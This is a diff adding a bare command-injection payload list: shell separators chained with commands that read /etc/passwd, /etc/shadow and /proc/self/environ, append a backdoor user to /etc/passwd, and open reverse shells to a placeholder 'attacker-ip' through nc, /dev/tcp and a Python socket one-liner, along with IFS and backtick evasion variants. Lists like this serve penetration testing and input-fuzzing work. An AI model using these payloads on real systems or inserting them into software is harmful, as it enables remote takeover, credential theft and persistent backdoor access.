@@ -1,0 +1,29 @@
+; ls
+; whoami
+; cat /etc/passwd
+
+&& id
+&& uname -a
+
+| grep root /etc/passwd
+| nc -e /bin/bash attacker-ip attacker-port
+
+|| echo "Vulnerable"
+
+; echo 'malicious content' > /tmp/malware.sh
+; cat /etc/shadow
+; echo "backdoor_user:password_hash" >> /etc/passwd
+
+; nc attacker-ip attacker-port -e /bin/bash
+; bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",attacker-port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+; cat /etc/passwd%00
+; $HOME
+; $PATH
+
+; cat /proc/self/environ
+; $(id)
+; `id`
+
+| echo$IFS`whoami`
